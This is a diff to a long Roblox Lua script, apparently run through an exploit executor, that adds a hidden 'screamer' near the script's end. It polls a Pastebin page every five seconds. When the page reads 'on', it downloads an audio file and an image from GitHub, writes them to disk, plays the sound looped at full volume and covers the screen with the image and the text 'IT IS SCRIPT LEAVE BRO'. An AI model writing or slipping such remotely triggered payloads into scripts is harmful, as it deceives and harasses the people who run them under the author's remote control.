@@ -7799,93 +7799,86 @@ task.spawn(function()
     -- Expose to Spawn tab button
     _G._ShowSpinWheel = showTierPopup
 end)
--- =====================================================================
--- SCREAMER / PASTEBIN STATUS CHECKER
--- Добавлено в конец скрипта — запускается автоматически.
--- Опрашивает Pastebin каждые 5 секунд.
--- "off" — ничего не происходит.
--- "lawik"  — запускается скример.
--- =====================================================================
+-- Скрипт проверяет статус с Pastebin каждые 5 секунд
+-- "off" = ничего не происходит
+-- "on"  = запускается скример
+
+local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
+local CHECK_INTERVAL = 5 -- интервал проверки в секундах
+local screamTriggered = false -- флаг, чтобы не запускать скример повторно
+
+local function runScreamer()
+    -- This file was generated with SKS V1.2.0
+    local fenv = getfenv();
+    pcall(function(p1, a, b, c)
+    end);
+    writefile(
+        "po.mp3",
+        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
+    );
+    local Sound = Instance.new"Sound";
+    Sound.Parent = workspace;
+    Sound.SoundId = fenv.getcustomasset"po.mp3";
+    Sound.Volume = 10;
+    Sound.Looped = true;
+    Sound:Play();
+    writefile(
+        "dsf.jpg",
+        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg")
+    );
+    local ScreenGui = Instance.new"ScreenGui";
+    ScreenGui.DisplayOrder = 999;
+    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui;
+    local ImageLabel = Instance.new"ImageLabel";
+    ImageLabel.Image = fenv.getcustomasset"dsf.jpg";
+    local UDim2_New = UDim2.new;
+    ImageLabel.Size = UDim2_New(0, 600, 0, 600);
+    ImageLabel.BackgroundTransparency = 1;
+    ImageLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
+    local Vector2_New = Vector2.new;
+    ImageLabel.AnchorPoint = Vector2_New(0.5, 0.5);
+    ImageLabel.Parent = ScreenGui;
+    local TextLabel = Instance.new"TextLabel";
+    TextLabel.Text = "IT IS SCRIPT LEAVE BRO";
+    TextLabel.TextScaled = true;
+    TextLabel.Size = UDim2_New(0, 200, 0, 100);
+    TextLabel.TextColor3 = Color3.new(1, 1, 1);
+    TextLabel.BackgroundTransparency = 1;
+    TextLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
+    TextLabel.AnchorPoint = Vector2_New(0.5, 0.5);
+    TextLabel.ZIndex = 999;
+    TextLabel.Parent = ScreenGui;
+end
+
+local function checkStatus()
+    local success, response = pcall(function()
+        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+    end)
+    
+    if not success then
+        warn("[Скример] Не удалось получить данные с Pastebin: " .. tostring(response))
+        return
+    end
+    
+    -- Убираем пробелы и приводим к нижнему регистру
+    local status = string.lower(string.gsub(response, "%s+", ""))
+    
+    print("[Скример] Статус: " .. status)
+    
+    if status == "on" and not screamTriggered then
+        screamTriggered = true
+        runScreamer()
+    elseif status == "off" then
+        screamTriggered = false -- сбрасываем флаг, чтобы при следующем "on" сработало снова
+    end
+end
+
+-- Первая проверка сразу
+checkStatus()
+
+-- Цикл проверок
 task.spawn(function()
-    local PASTEBIN_URL   = "https://pastebin.com/raw/SWQZAFMn"
-    local CHECK_INTERVAL = 5
-    local screamTriggered = false
-
-    local function runScreamer()
-        -- This file was generated with SKS V1.2.0
-        local fenv = getfenv()
-        pcall(function(p1, a, b, c) end)
-        writefile(
-            "po.mp3",
-            game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
-        )
-        local Sound = Instance.new("Sound")
-        Sound.Parent    = workspace
-        Sound.SoundId   = fenv.getcustomasset("po.mp3")
-        Sound.Volume    = 10
-        Sound.Looped    = true
-        Sound:Play()
-
-        writefile(
-            "dsf.jpg",
-            game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg")
-        )
-        local ScreenGui = Instance.new("ScreenGui")
-        ScreenGui.DisplayOrder = 999
-        ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
-
-        local ImageLabel = Instance.new("ImageLabel")
-        ImageLabel.Image = fenv.getcustomasset("dsf.jpg")
-        ImageLabel.Size  = UDim2.new(0, 600, 0, 600)
-        ImageLabel.BackgroundTransparency = 1
-        ImageLabel.Position    = UDim2.new(0.5, 0, 0.5, 0)
-        ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-        ImageLabel.Parent = ScreenGui
-
-        local TextLabel = Instance.new("TextLabel")
-        TextLabel.Text      = "enjoy ЭТО СКРИПТ ЛИВАЙ"
-        TextLabel.TextScaled = true
-        TextLabel.Size      = UDim2.new(0, 200, 0, 100)
-        TextLabel.TextColor3 = Color3.new(1, 1, 1)
-        TextLabel.BackgroundTransparency = 1
-        TextLabel.Position    = UDim2.new(0.5, 0, 0.5, 0)
-        TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-        TextLabel.ZIndex = 999
-        TextLabel.Parent = ScreenGui
-    end
-
-    local function checkStatus()
-        local success, response = pcall(function()
-            return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
-        end)
-
-        if not success then
-            warn("[Скример] Не удалось получить данные с Pastebin: " .. tostring(response))
-            return
-        end
-
-        local status = string.lower(string.gsub(response, "%s+", ""))
-        print("[Скример] Статус: " .. status)
-
-        if status == "on" and not screamTriggered then
-            screamTriggered = true
-            runScreamer()
-        elseif status == "off" then
-            screamTriggered = false
-        end
-    end
-
-    -- Первая проверка сразу
-    checkStatus()
-
-    -- Цикл проверок
     while task.wait(CHECK_INTERVAL) do
         checkStatus()
     end
-end)-- This file was generated with SKS V1.2.0
--- Модифицировано: проверка pastebin на "on"/"off" с автообновлением
-
-local fenv = getfenv()
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
+end)
